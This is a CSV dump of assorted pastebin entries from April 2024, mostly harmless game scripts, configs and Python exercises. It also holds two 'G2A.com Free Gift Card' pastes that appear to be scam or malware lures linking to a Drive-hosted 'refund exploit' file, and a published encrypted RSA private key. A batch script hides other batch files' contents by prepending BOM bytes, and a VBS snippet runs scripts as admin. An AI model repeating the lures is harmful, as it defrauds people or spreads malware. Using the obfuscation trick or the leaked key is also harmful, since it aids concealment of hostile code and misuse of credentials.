id,title,username,language,date,content
ZxRJz4nQ,crazy gloom2 light style,illwieckz,C,Saturday 13th of April 2024 12:59:34 PM CDT,"gloom2beta2/71955335FA395BA4338DCE6901B1005B
{ // Q3Map2 defaulted
	{
		map $lightmap
		rgbGen identity
	}
	
	// Q3Map2 custom lightstyle stage(s)
	{
		map maps/gloom2beta2/lm_0013.tga
		blendFunc GL_SRC_ALPHA GL_ONE
		rgbGen wave noise 1 .75 1.6 4.2 // style 2
		tcGen lightmap
	}
	{
		map $lightmap
		blendFunc GL_SRC_ALPHA GL_ONE
		rgbGen wave noise 1 .5 3.7 4.9 // style 3
		tcGen lightmap
		tcMod transform 1 0 0 1 0.50000 0.00000
	}
	{
		map maps/gloom2beta2/lm_0013.tga
		blendFunc GL_SRC_ALPHA GL_ONE
		rgbGen wave noise 1 1 2.6 1.3 // style 4
		tcGen lightmap
		tcMod transform 1 0 0 1 0.50000 0.00000
	}

	{
		map textures/gloom2/es_dark-mtl_l1_vd1a.tga
		blendFunc GL_DST_COLOR GL_ZERO
		rgbGen identity
	}
}"
XLfKCaGn,monsterLoveExample,MarcoFalciglia,C#,Saturday 13th of April 2024 12:51:32 PM CDT,"using System.Collections;
using System.Collections.Generic;
using MonsterLove.StateMachine;
using UnityEngine;

public enum StatesPrepareTea
{
    Initialization,
    FullfillTeaPotWithWater,
    PutTeaBagInside,
    PutTeaPotOnStove,
    Completed
}

public class PrepareTea : MonoBehaviour
{
    public GameObject teapot;
    public StateMachine<StatesPrepareTea> _stateMachine;
    public StatesPrepareTea initialStateDebug;

    
    //Singleton
    private static PrepareTea _instance;
    public static PrepareTea Instance => _instance;
    
    protected override void Awake()
    {
        base.Awake();
    
        _instance = this;
        _stateMachine = new StateMachine<StatesPrepareTea>( this );
        
        teapot.GetComponent<Animator>().enabled = false;
            
        _stateMachine.ChangeState(StatesPrepareTea.FullfillTeaPotWithWater);
    }

    protected override void Start()
    {
        base.Start();

        changeState(StatesOS4.FullfillTeaPotWithWater);
     
    }
    
    public void changeState(StatesPrepareTea _newState)
    {
        _stateMachine.ChangeState(_newState);
    }
    
    private void Initialization_Enter() {
        Debug.Log( ""Entro nello State di Initialization"" );
    }    
    
    private void FullfillTeaPotWithWater_Enter() {
        Debug.Log( ""Entro nello State FullfillTeaPotWithWater"" );
    }
    
    private void PutTeaBagInside_Enter() {
        Debug.Log( ""Entro nello State PutTeaBagInside"" );
    }
    
    private void PutTeaPotOnStove_Enter() {
        Debug.Log( ""Entro nello State PutTeaPotOnStove,"" );
    }    
    
    private void Completed_Enter() {
        Debug.Log( ""Entro nello Stato Finale"" );
    }

	private void ManageFlow()
	{
		Action transition = null;

		if (nextState == StatesPrepareTea.PutTeaPotOnStove) // se il te è pronto
		{
			if (/* condizione che mi interessa*/) { 
				transition = () =>
				{
					_stateMachine.ChangeState( nextState ); // vado verso la conclusione
				};
			} else {
				transition = () =>
				{
					// funzione per gestire il cambio di stato dove mi interessa. Magari ricomincio da capo
					_stateMachine.ChangeState( StatesPrepareTea.Initialization );
				};
			}
		}
		else // magari sono in una fase precedente...
 		{
		}
	}

}

----
// IN UN'ALTRA CLASSE, POTRESTE GESTIRE CON UN RIFERIMENTO STATICO GLI STATI INTERNI ALLA FINITE STATE MACHINE

public class ManageStates
{
 	private AudioSource _audioSource;

	public AudioClip comment_FullfillTeaPotWithWater;
    public AudioClip comment_PutTeaBagInside;
    public AudioClip comment_PutTeaPotOnStove;


private void performAudioCommentBasedOnPhase()
    {
        switch (PrepareTea.Instance._stateMachine.State)
        {
            case StatesPrepareTea.FullfillTeaPotWithWater:
                _audioSource.PlayOneShot(comment_FullfillTeaPotWithWater);
                break;
            case StatesPrepareTea.PutTeaBagInsidee:
                _audioSource.PlayOneShot(comment_PutTeaBagInside);
                break;
            case StatesPrepareTea.PutTeaPotOnStove:
                _audioSource.PlayOneShot(comment_PutTeaPotOnStove);
                break;
     
        }

    }
}
"
0a1VTavc,Untitled,youske,Python,Saturday 13th of April 2024 12:51:30 PM CDT,# EC2instance 起動スクリプト
XuHfJpX9,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Saturday 13th of April 2024 12:43:10 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_482456.pdf

Working as of:
13 April 2024"
7jRwmjxF,Untitled,Stoikiti,Lua,Saturday 13th of April 2024 12:19:16 PM CDT,"function widget:GetInfo()
    return {
      name = ""repeat repeat orders"",
      desc = ""a way to keep track of multiple sets of repeat orders and cycling through them"",
      author = ""zombean"",
      date = ""2024"",
      license = ""GNU GPL, v2 or later"",
      layer = 0,
      enabled = true
    }
end

local repeat_orders = {}
local mode_activated = false
local activate_mode_key = 420
local go_to_next_repeat_key = 421

function widget:KeyPress(keyCode, mods, label, utf32char, scanCode, actionList)
  if #actionList then return end -- do nothing if engine has actions for these key pressed
end

function widget:KeyRelease(keyCode, mods, label, utf32char, scanCode, actionList)
  if #actionList then return end -- do nothing if engine has actions for these key pressed
end

function widget:UnitCommand(unitID, unitDefID, unitTeam, cmdID, cmdParams, options, cmdTag)
  --if not on repeat orders return
end

function widget:UnitDestroyed(unitID)
  if repeat_orders[unitID] then
    repeat_orders[unitID] = {}
  end
end

function widget:UnitTaken(unitIT)
  if repeat_orders[unitID] then
    repeat_orders[unitID] = {}
  end
end

function widget:UnitGiven(unitIT)
  if repeat_orders[unitID] then
    repeat_orders[unitID] = {}
  end
end

local millis_start_timer = Spring.GetTimer()
local function millis()
  return math.ceil(Spring.DiffTimers(Spring.GetTimer(), millis_start_timer) * 1000)
end

local next_call = 0

function widget:Update()
  local now_time = millis()
  if next_call > now_time then return end
  next_call = now_time + 1000
  Spring.Echo(os.date(""%H:%M:%S:%MS""), mode_activated)
end"
JFSey4ik,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Saturday 13th of April 2024 12:14:38 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
 
Working as of:
13 April 2024"
NrZ1bwqX,True QEMU Guest Agent ping,Infra_HDC,Bash,Saturday 13th of April 2024 11:37:16 AM CDT,"user@host:~$ virsh --connect=qemu:///system qemu-agent-command virthost-0001 '{""execute"":""guest-ping""}'
{""return"":{}}
"
EBymbgP7,Untitled,MisterQuirk,Python,Saturday 13th of April 2024 11:00:08 AM CDT,"#Task 1
import time
def timer(func):
    def inside_func(*args, **kwargs):
        st = time.time()
        func(*args)
        fin = time.time()
        print(f'Function worked for {fin - st} seconds')

    return inside_func


#Task 2

def cache(f):
    D = dict()
    def inside_f(*args):
        if args not in D:
            D[args] = f(*args)
        return D[args]
    return inside_f

#Task 3

def logging(f):
    def inside(*args):
        result = f(*args)
        with open('log.txt', 'a+') as file:
            print(f'The function has been called {f.__name__}, the result of its work is - {result}', file=file)
            return result

    return inside

#Task 4

def retry(sec, times):
    def decor(f):
        def inside(*args):
            for i in range(times):
                if f(*args) is not None:
                    return f(*args)
                time.sleep(sec)
            return None
        return inside
    return decor

"
Gk2iqPeA,Untitled,zikoman,HTML,Saturday 13th of April 2024 10:30:19 AM CDT,"----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,CC229417351882A9C41807DB15DA8F63

5o7QxXZ+AuoEmz6nHOtBAKW1zjQJ+yxO+0UYn6YzvOGjKVLuBlhXl/+Id1h2zl5U
PdJRGs0k7PEvNbqMwmerDY0xaSR8GAk8bSrwdD0WGOoM2XT2vk5bZApylhJlhWQa
t7ZOSVY3e4OkhNWg4XFo/EK8qlU14RQxDU/e2FsKvdT3iC+mzTmprDrJdPG5SupJ
mzQZyzv+TUoukFK3Ec64aoVsnGicsCBM3Yj7LfqLONQtUth4feASRH3i7wH2mMJk
/JLnPzo/kx/QOcU8f73wfrmv5a6LDxIfaLD85x/xBxfpBebPzR6tbQcTes8eoDIE
KKlCyiyctZ3z1ra67gk2N9QU2HaHccxNlUxZstO0F1NO2rpCwsEoISCGlkVJAX2u
9/hqCX5DwpgeymmgksIWQ5WliVpXThYnDhhCGQPaLkpiffmxordNNCPS4Ip0g46x
z6r9MWsiuzOutsJMMsBe6sQZpAs9VwIxufVwh1xOYKHb8m25CyPswbGiuDXWDUQr
inb8tGmks26PJRw/uijut/LosQ1HW3oV7+ErgCJ1OzS2fN766vLQDKwhQSVR9DYU
GwkjpkDCz7U7nlxXgs2doI38hPeVFH511HJbGjRv2tturqlW9+1UJ7g+u+hRv3GP
O0Bjd0AkHJGrvYguGOB2PwzoGP3HiZMYlR3R6sCC6ds2bXJSXlwDucEVu8xrWdIT
Ri0h11osob4fKJtagovOTf3i9Ca7FgrgI6mukFH45u5BZeQRvHgyOlGv+JbAX9TM
meofo+eRHBded4X6xWDsokf/yZTFRf+wS6eMqT35hI471P808tW7ZnlBeq76n/+P
xFVyCdnDuilLcngbzIA6gFkGrlebaP8P/GFrPFIPhfDRcG57CSMekWsbQ2/gApfx
BFqH0calKvlYgMccqzxyB0F78QQ6rO6+LGiLUWuXJmAc9z+duWFT1mlfINY7pMop
RakoWm6WGruiSQooadteGrQE2XDcVvjo06eMnA2A16W1p1HXlr2i2nLNj7G4KC3L
7cVCqkZPfE4cF816HU7oMUh6i53SfJAT/Km54Riadvd2zFk4rNLkwmXiAMDBa4BP
ndplVGEGqxYkTLNLTHUgbbIa8oOKw0WPLOtDSIoI6emhHBp2ei/xnsNfuNQcS3X1
GJMYVxpqBKwhQpsuXqc4sJZdn7+q0TlNkMsSXhCqUTw6we1W5sHPvnRZMNWvZdbP
c/BNa4Zpl5TNLcuO/1CioP4D3Li8cToysZIpx827zXU1lHCIznDD0gcanf3qV97Y
+RODn1a6OcvlxToIJcJZCShTM5EM0MIU2Sx3wVZ7MGm7d2WMMyridrPTqIRGfprC
R7umjQeucFqVxudEqiuNBreLV0MlDok8ogcUVNtgIl9KceC+8iQG64Z4YreoHluG
69MbeGj3Mdtk50wpRQQyond1whFJrSjoJaemdWaFdFBzg/7mqcN0GHjolBiV+F3d
qNynvPkOhvXuwNAVyhXdmeQfFCcuUyC3vXjMohvjOXAZ4w/yc0BqqvEQD2N4lAtf
ZTmoOGrktnAoZcJDTvRnos2zqNw5LU2WNyclbZm5cPDaJkAh5swGYSADDu5QYeuB
-----END RSA PRIVATE KEY-----"
QXkrar3a,Power_control,kk258966,Lua,Saturday 13th of April 2024 10:19:59 AM CDT,"-- Default settings, do not change
local options = {
  -- Unique identifier for this matrix on rednet, required for rednet functionality
  rednet_identifier = '',
 
  -- Energy type being displayed (J, FE)
  energy_type = 'FE',
 
  -- Update frequency, in seconds
  update_frequency = 1,
 
  -- Text scale on the monitor
  text_scale = 1,
 
  -- Output debug data to the computer's internal display
  debug = true,
}

--------------------------------------------------
--- Internal variables, DO NOT CHANGE
--------------------------------------------------
 
--- This will be used as the installer source (Pastebin)
local INSTALLER_ID = 'LMdUZY4Z'
 
--- Supported energy suffixes
local energy_suffixes = { 'k', 'M', 'G', 'T', 'P' }
 
--- Supported time periods when converting seconds
local time_periods = {
  { 'weeks', 604800 },
  { 'days', 86400 },
  { 'hours', 3600 },
  { 'minutes', 60 },
  { 'seconds', 1 },
}
 
--- This is our Induction Matrix, we'll auto-detect it later
local cube = nil
 
--- This is our Monitor, we'll auto-detect it later
local monitor = nil
 
--------------------------------------------------
--- Helper functions
--------------------------------------------------

--- Holds the current buffer of data being printed
local machine_term = term.current()
local print_buffer = {}
 
--- Writes data to the output monitor buffer
function print_r (text)
  table.insert(print_buffer, text)
end
 
--- Writes formatted data to the output monitor buffer
function print_f (format, ...)
  print_r(string.format(format, ...))
end
 
--- Writes the buffer into the output monitor
function print_flush ()
  if monitor then
    -- Redirects writes to monitor (if any)
    if monitor then
      term.redirect(monitor)
    end
 
    -- Clears terminal
    term.clear()
    term.setCursorPos(1, 1)
 
    -- Writes new data
    print(table.concat(print_buffer or {}, '\n'))
 
    -- Redirects writes back to computer (if using monitor)
    if monitor then
      term.redirect(machine_term)
    end
  end
 
  -- Clears buffer
  print_buffer = {}
end
 
--- Writes debug info to the machine
function debug (...)
  if options.debug then
    print(...)
  end
end

--- Rounds a number with N decimals
function round_decimal (number, decimals)
  local multiplier = math.pow(10, decimals or 0)
  return math.floor(number * multiplier) / multiplier
end
 
--- Rounds a percentage (0..1) to a number of decimals
function round_percentage (number, decimals)
  return ('%s%%'):format(round_decimal(100 * number, decimals or 1))
end

function print_cube_info (cube_info)
  print_r('Energy Production Control')
  print_r('------------------')
  print_r('')
  print_f('Power : %s', energy_string(cube_info.energy_stored))
  print_f('Limit : %s', energy_string(cube_info.energy_capacity))
  print_f('Charge: %s', round_percentage(cube_info.energy_percentage))
  print_r('')
  print_f('Input : %s/t', energy_string(cube_info.io_input))
  print_f('Output: %s/t', energy_string(cube_info.io_output))
  print_f('Max IO: %s/t', energy_string(cube_info.io_capacity))
  print_f('Stat: %s/t', cube_info.gen_stats)
  print_r('')
  

end
-- Detects peripherals
monitor = peripheral.find('monitor')

if monitor then
  debug('Monitor detected, enabling output!')
  monitor.setTextScale(options.text_scale)
else
  debug('No monitor detected, entering headless mode!')
 
 
end





--------------------------------------------------
--- Main runtime
--------------------------------------------------
 
debug('Entering main loop...')
--- This will be updated after every energy collection, it is used to calculate how much power is actually being added/removed from the system
local energy_stored_previous = nil

while true do
  local status, err = pcall(function () 
    -- Attempts to auto-detect missing Cube
    if not Cube then
      Cube = peripheral.find('mekanism:ultimate_energy_cube')
 
      -- Checks if it worked
      if not Cube then
        error('Cube not connected!')
      end
    end
	
	 --- Save status
    local charge_status = 1
  
    --- This is our main information
    local cube_info = {
      energy_stored = cube.getEnergy(),
      energy_capacity = cube.getMaxEnergy(),
      energy_percentage = cube.getEnergyFilledPercentage(),
      io_input = cube.getLastInput(),
      io_output = cube.getLastOutput(),
      io_capacity = cube.getTransferCap(),
	  gen_stats = gen_stats_input
    }
	
     if charge_status == 1 then
		if energy_capacity < 50 then
			redstone.setOutput(""right"", false)
			gen_stats_input = ""Charging ...""
			charge_status = 2
			end
		else
			if energy_capacity > 90 then
			redstone.setOutput(""right"", true)
			gen_stats_input = ""Idle""
			charge_status = 1
			end
		end
		
		
 
     if not energy_stored_previous then
      energy_stored_previous = cube_info.energy_stored
    end
	
	-- Calculates power changes and adds them to our information
    cube_info.change_interval = options.update_frequency
    cube_info.change_amount = cube_info.energy_stored - energy_stored_previous
    cube_info.change_amount_per_second = cube_info.change_amount / options.update_frequency
	
	
    -- General stats
    cube_info.is_charging = cube_info.change_amount > 0
    cube_info.is_discharging = cube_info.change_amount < 0
 
    -- Sets the new ""previous"" value
    energy_stored_previous = cube_info.energy_stored
 
     
   -- Prints the matrix information
    print_cube_infoinfo(cube_info)
  end)
 
  -- Checks for errors (might be disconnected)
  if not status then
    -- Clears buffer first
    print_buffer = {}
 
    -- Shows error message
    print_r('Error reading data')
    print_r('Check connections.')
    print_r('------------------')
    print_r(err)
  end
 
  -- Outputs text to screen
  print_flush()
 
  -- Waits for next cycle
  os.sleep(options.update_frequency)
end"
vSaWQnFu,Untitled,MisterQuirk,Python,Saturday 13th of April 2024 10:16:09 AM CDT,"#Task 1

def sum_numbers(*numbers):
    return sum(numbers)

#Task 2

def print_kwargs(**kwargs):
    for line in kwargs:
        print(f'{line}: {kwargs[line]}')


#Task 3

def filter_by_length(min_length, *args):
    ans = list()
    for line in args:
        if len(line) >= min_length:
            ans.append(line)
    return ans

#Task 4

def calculate_total_price(cost, **kwargs):
    total_discount = 0
    for item in kwargs:
        total_discount += kwargs[item]
    return cost - cost * (total_discount * 0.01)

#Task 5

def custom_print(*args, **kwargs):
    endline = kwargs.get('end', '\n')
    separator = kwargs.get('sep', ' ')

    arr = list()

    for line in args:
        arr.append(str(line))

    for key, item in kwargs.items():
        if key != 'sep' and key != 'end':
            arr.append(f'{key} = {item}')

    print(separator.join(arr), end=endline)
"
weLeRnRP,system,AlewAlow,Lua,Saturday 13th of April 2024 09:58:55 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local Matter = require(ReplicatedStorage.Shared.Libs.Matter)
local Components = require(ReplicatedStorage.Shared.Components)

local function MoveTransforms(world, state)
	for id, transform, velocity in world:query(Components.Transform, Components.Velocity):without(Components.NonShared) do
		world:insert(id, transform:patch({
			Position = transform.Position + velocity.Velocity * Matter.useDeltaTime()
		}))
	end
end

return MoveTransforms"
zzAbAHtQ,Mad,Unknown_No_1,PHP,Saturday 13th of April 2024 09:54:27 AM CDT,2024LastInternetYearWW3
JwPWwGYD,SFWBar config,daddy_jones,CSS,Saturday 13th of April 2024 09:49:21 AM CDT,"# Override gtk theme
# theme = ""Adwaita-dark""
# Override gtk icon theme
# IconTheme = ""Adwaita""

Set Term = ""alacritty""

# Window Placer
placer {
  xorigin = 5  # place the first window at X% from the left
  yorigin = 5  # place the first window at X% from the top
  xstep = 5    # step by X% of desktop horizontally
  ystep = 5    # step by X% of desktop vertically
  children = true
}

# Task Switcher
switcher {
  interval = 700
  icons = true
  labels = false
  cols = 5
}

function(""SfwbarInit"") {
  SetBarId ""bar-0""
  SetLayer ""top""
  SetExclusiveZone ""auto""
  SetMonitor ""eDP-1""
  SetBarSize ""80%""
#  SetBarSize ""bar1"",""800"" 
  SetMirror ""*""
}

include(""winops.widget"")

# Panel layout

layout ""sfwbar"" {
 ##  include(""startmenu.widget"")
  include(""showdesktop.widget"")

  taskbar {
    rows = 1
    group = true
    group cols = 1
    group style = ""taskbar_group""
    group labels = true
    group icons = true
    icons = true
    labels = false
    action[3] = Menu ""winops""
    ## filter=output
  }

  label { css = ""* { -GtkWidget-hexpand: true; min-height: 28px; }"" }

  tray {
    rows = 1
  }

#  include(""battery-svg.widget"")
   include(""bluez.widget"")
# include(""rfkill-wifi.widget"")
# include(""rfkill-bt.widget"")
  include(""network-module.widget"")
# Select pulse-module or alsa-module based on your sound configuration
  include(""pulse-module.widget"")
# include(""alsa-module.widget"")
   include(""mpd-intmod.widget"")
   include(""sway-lang.widget"")

  Label {
  Value = Str(NetStat(""rxrate"") / 1024 / 1024) + "" Mbps""
  Css = ""* { min-width: 100px; }""
  }

  grid {
    css = ""* { -GtkWidget-direction: bottom; padding: 5px; padding-left: 0px; }""
    label {
      value = Time(""%k:%M"")
      style =""clock""
    }
    label {
      value = Time(""%x"")
      style =""clock""
    }
  }
}

#CSS
@define-color theme_bg_color #353231;
@define-color theme_fg_color #d1d1d1;
@define-color theme_text_color #d1d1d1;
@define-color borders #777777;

window {
  -GtkWidget-direction: bottom;
  background-color: #353231;
}

label {
  font: 12px sans;
  color: @theme_text_color;
  text-shadow: none;
}

button,
button image {
  outline-style: none;
  box-shadow: none;
  background-image: none;
  border-image: none;
}

window#taskbar_group {
  background-color: RGBA(0.2,0.2,0.2,0.5);
}

#hidden {
  -GtkWidget-visible: false;
}

button#taskbar_group_normal,
button#taskbar_group_normal:hover,
button#taskbar_group_active {
  margin: 0px;
  border: 0px;
  border-radius: 0px;
  -GtkWidget-valign: center;
}

button#taskbar_group_normal image,
button#taskbar_group_normal:hover image,
button#taskbar_group_active image {
  min-height: 30px;
  min-width: 30px;
  margin: 0px;
}

button#taskbar_group_active {
  background-color: #493B41;
}

button#taskbar_normal:hover,
button#taskbar_group_normal:hover,
button#taskbar_group_active:hover {
  background-color: #535353;
}

button#taskbar_normal grid {
  padding-right: 0px;
  margin-right: 0px;
  min-height: 0px;
}

button#taskbar_normal image,
button#taskbar_active image,
button#taskbar_normal:hover image {
  min-width: 18px;
  min-height: 18px;
}

button#taskbar_normal label,
button#taskbar_active label,
button#taskbar_normal:hover label {
  -GtkWidget-hexpand: true;
  -GtkWidget-halign: start;
  padding: 0px 7px 0px 0px;
}

button#taskbar_normal,
button#taskbar_active,
button#taskbar_normal:hover {
  border-radius: 0;
  border: 0px;
  box-shadow: none;
  -GtkWidget-hexpand: false;
  -GtkWidget-vexpand: false;
  min-height: 0px;
  background-color: #535353;
}

button#taskbar_active {
  background-color: #646464;
}


button#taskbar_normal:hover {
  background-color: #646464;
}

#menu_item,
#menu_item *,
#menu_item image,
#menu_item label {
  -GtkWidget-halign: start;
  color: white;
}

#menu_item image {
  min-width: 16px;
  min-height: 16px;
  padding-right: 2px;
}

menu {
  background-color: #353231;
}

menu arrow {
  background: none;
}

button#pager_normal,
button#pager_visible,
button#pager_focused {
  padding: 0px 5px 0px 5px;
  border-radius: 0;
}

button#pager_focused {
  background-color: #bbddff;
}

button#pager_preview {
  border-radius: 0;
  border-color: #000000;
  border-width: 0.25mm;
  color: #777777;
  min-width: 5cm;
  min-height: 2.8125cm;
}

grid#pager {
  outline-color: #000000;
  outline-style: dashed;
  outline-width: 0.25mm;
}

grid#switcher_active image,
grid#switcher_active {
  min-width: 50px;
  min-height: 50px;
  padding: 5px;
  background-color: #646464;
  border-radius: 5px;
  -GtkWidget-hexpand: true;
}

grid#switcher_normal image,
grid#switcher_normal {
  min-width: 50px;
  min-height: 50px;
  padding: 5px;
  -GtkWidget-direction: right;
  -GtkWidget-hexpand: true;
}

window#switcher { 
  border: 1px solid @borders;
  border-radius: 5px; 
  padding: 5px; 
  -GtkWidget-hexpand: true;
}

grid#switcher { 
  border-radius: 5px;
  padding: 5px;
  -GtkWidget-hexpand: true;
}

button#tray_active,
button#tray_passive,
button#tray_attention {
  border: 0px;
  margin: 0px;
  border-radius: 0px;
}

button#tray_passive {
  -GtkWidget-visible: false;
}

button#tray_active label,
button#tray_passive label,
button#tray_attention label {
  padding: 1px;
  color: @theme_text_color;
}

button#tray_active image,
button#tray_passive image,
button#tray_attention image {
  min-width: 18px;
  min-height: 18px;
  -GtkWidget-vexpand: true;
  -GtkWidget-halign: center;
  -GtkWidget-valign: center;
}

label#clock {
  color: @theme_text_color;
  -GtkWidget-vexpand: true;
  -GtkWidget-valign: center;
  font-size: 12px;
}

label#sway_lang {
  margin-left: 3px;
  margin-right: 5px;
}

grid#layout {
  -GtkWidget-direction: right;
}

button#module,
button#showdesktop,
button#startmenu {
  margin: 0px;
  border: 0px;
  border-radius: 0px;
  min-height: 18px;
  min-width: 18px;
  -GtkWidget-valign: center;
  -GtkWidget-vexpand: true;
  padding: 0px 3px 0px 3px;
}

button#startmenu,
button#showdesktop {
  min-width: 24px;
  min-height: 24px;
}

* {
  color: #ffffff;
}
"
Y9TvHnJd,chunkMiner,mathiaas,Lua,Saturday 13th of April 2024 09:08:54 AM CDT,"-- todo when low fuel lvl: refuel
-- deal with multiple chunks

local args = {...}
local starting_height = tonumber(args[1])
--local chunks_to_mine = tonumber(args[2])
local chunk_size = 32
local minimum_height = 8

if #args < 1 then
    --print(""Usage: chunkMiner <starting height> <chunks to mine>"")
    print(""Usage: chunkMiner <starting height>"")
    return
end

assert(loadfile(""utils""))()
assert(loadfile(""movement""))()

local items = {
    end_chest = ""EnderStorage:enderChest""
}

local function init()
    local ender_chest_present = false
    local required_fuel = chunk_size * ((starting_height - minimum_height) * 2)

    if turtle.getFuelLevel() < required_fuel then
        print(""Required fuel: "" .. required_fuel)
        print(""Current fuel: "" .. turtle.getFuelLevel())
        print(""Not enough fuel to start... Hold ctrl + t to terminate"")
        while true do sleep(100) end
    end


    while not ender_chest_present do
        for k,v in pairs(getInventory()) do
            if v.name == items.end_chest then
                shell.run(""clear"")
                ender_chest_present = true
                break
            end
        end
        print(""Put ender chest in inventory"")
        sleep(1)
    end
end

local function ender_deposit()
    local inventory = getInventory()
    if #inventory < 10 then
        return false
    end

    for k, v in pairs(inventory) do
        if v.name == items.end_chest then
            turtle.select(v.slot)
            turtle.digUp()
            turtle.placeUp()
            break
        end
    end

    for k, v in pairs(inventory) do
        if v.name ~= items.end_chest then
            turtle.select(v.slot)
            turtle.dropUp()
        end
    end

    turtle.digUp()
end


local function mine(direction)
    direction = direction or ""front""
    local detect = turtle.detect
    local dig = turtle.dig

    if direction == ""up"" then
        detect = turtle.detectUp
        dig = turtle.digUp
    elseif direction == ""down"" then
        detect = turtle.detectDown
        dig = turtle.digDown
    end

    while detect() do dig() end

    ender_deposit()
end


local function mine_row(steps)
    for _ = 1, steps do
        mine()
        f()
    end
end


local function handle_turn(layer, idx)
    local even_layer = layer % 2 == 0
    local turn = (idx % 2 == 1) ~= even_layer and l or r
    turn()
    mine()
    f()
    turn()
end


local function mine_layer(layer)
    for idx = 1, chunk_size do
        mine_row(chunk_size - 1)
        if idx ~= chunk_size then
            handle_turn(layer, idx)
        else
            l(2)
        end
    end
end


local function mine_cube(starting_height)
    chunks_to_mine = chunks_to_mine or 1
    starting_height = starting_height - minimum_height

    init()

    for layer = 1, starting_height do
        mine_layer(layer)
        if layer ~= starting_height then
            mine(""down"")
            d()
        end
    end
    u(starting_height)
end


mine_cube(starting_height)"
QkUQJNmx,client side replication part after edit,AlewAlow,Lua,Saturday 13th of April 2024 09:05:13 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local Components = require(ReplicatedStorage.Shared.Components)

local remoteEvent = ReplicatedStorage:WaitForChild(""MatterRemote"")

local function SetupReplication(world, state)
	local function debugPrint(...)
		if state.debugEnabled then
			print(""Replication>"", ...)
		end
	end
	
	remoteEvent.OnClientEvent:Connect(function(entities)
		for entityId, componentMap in entities do
			local entityId = tonumber(entityId)
			local exists = world:contains(entityId)
			
			if exists and next(componentMap) == nil then
				world:despawn(entityId)
				debugPrint(string.format(""Despawn %s"", entityId))
				continue
			end

			local componentsToInsert = {}
			local componentsToRemove = {}

			local insertNames = {}
			local removeNames = {}

			for name, container in componentMap do
				if container.data then
					table.insert(componentsToInsert, Components[name](container.data))
					table.insert(insertNames, name)
				else
					table.insert(componentsToRemove, Components[name])
					table.insert(removeNames, name)
				end
			end

			if not exists then
				-- the ""NonShared"" is used for shared systems that run on both sides
				-- by filtering out by default entities that were created on the server and replicated to the client
				-- which leads to shared systems running for the entity on the same side they were created on
				-- an example of a shared system is a system of mine that handles checking collisions
				-- by doing the same calculations each frame and storing the results which are a table of ids
				-- in a component, which would have been hard to do because of how ids are not the same on
				-- both sides so entities created on the server would have replicated false ids compared to the client
				-- but thanks to this change they work well
				world:spawnAt(entityId, Components.NonShared(), unpack(componentsToInsert))
				
				debugPrint(
					string.format(""Spawn %s with %s"", entityId, table.concat(insertNames, "",""))
				)
			else
				if #componentsToInsert > 0 then
					world:insert(entityId, unpack(componentsToInsert))
				end
			
				if #componentsToRemove > 0 then
					world:remove(entityId, unpack(componentsToRemove))
				end

				debugPrint(
					string.format(
						""Modify %s adding %s, removing %s"",
						entityId,
						if #insertNames > 0 then table.concat(insertNames, "", "") else ""nothing"",
						if #removeNames > 0 then table.concat(removeNames, "", "") else ""nothing""
					)
				)
			end
		end
	end)
end

return SetupReplication
"
a3n2xuM2,Run Batch Script As Admin [VBS],sofaygo,VBScript,Saturday 13th of April 2024 08:52:01 AM CDT,"[[-]] VBS/Batch - Run Script As Admin [[-]]
 
VBS File:
Set objShell = CreateObject(""Shell.Application"")
Set objShellShell = CreateObject(""WScript.Shell"")
strScriptPath = objShellShell.CurrentDirectory & ""\replace with your file name.bat""
 
objShell.ShellExecute ""cmd.exe"", ""/c """""" & strScriptPath & """""""", """", ""runas"", 1
 
Save this as RunAsAdmin.vbs. Then, create a batch script to run this.
 
For example: 
@echo off
RunAsAdmin.vbs >nul
exit"
0Xate4Q3,Script Obfuscator (Batch File),sofaygo,Batch,Saturday 13th of April 2024 08:43:44 AM CDT,"[[-]] Batch Obfuscator Code [[-]]

Batch Obfuscator/Deobfuscator:

Just drag the batch script you want to obfuscate to the obfuscate.bat

To deobfuscate the file, drag the obfuscated batch script to it.

[[-]] Code [[-]]

Obfuscate:
@echo off
REM Code to obfuscate the file
if ""%~1""=="""" exit /b
if /i ""%~x1"" neq "".bat"" if /i ""%~x1"" neq "".cmd"" exit /b
for /f %%i in (""certutil.exe"") do if not exist ""%%~$path:i"" (
  echo CertUtil.exe not found.
  pause
  exit /b
)
>""temp.~b64"" echo(//4mY2xzDQo=
certutil.exe -f -decode ""temp.~b64"" ""%~n1___%~x1""
del ""temp.~b64""
copy ""%~n1___%~x1"" /b + ""%~1"" /b

Deobfuscator:
@echo off
REM Deobfuscates the file that is obfuscated.
setlocal
if ""%~1""=="""" exit /b
if /i ""%~x1"" neq "".bat"" if /i ""%~x1"" neq "".cmd"" exit /b
<""%~1"" ((for /l %%N in (1 1 8) do pause)>nul&findstr ""^"">""%~n1__%~x1"")

"
TkP4UHhR,Untitled,MisterQuirk,Python,Saturday 13th of April 2024 07:38:41 AM CDT,"x = open('my_text.txt')

#Task 1
def string_1(x):
    with open(x,'r') as file:
        data = file.read()
    return data

#Task 2
def string_2(x):
    with open(x,'r') as file:
        data = file.readline()
    return data

#Task 3
def string_3(x):
    with open(x,'r') as file:
        data = file.readlines()
    return data

#Task 4
def string_4(x):
    with open(x,'r') as file:
        data = file.read().split('\n')
    return data

#Task 5
def string_5(x):
    with open(x,'r') as file:
        for line in file:
            print(line, end='')

#Task 6
def string_6(x):
    with open(x,'r') as file:
        st = ' '.join(file.readlines()).replace('\n', '')
        return st

#Task 7
def string_7(x):
    return x.strip()

#Task 8
def string_8(string):
    return string.strip('!?.')

#Task 9
def string_9(string):
    with open(string,'w') as file:
        file.write(string)

#Task 10
def string_10(string):
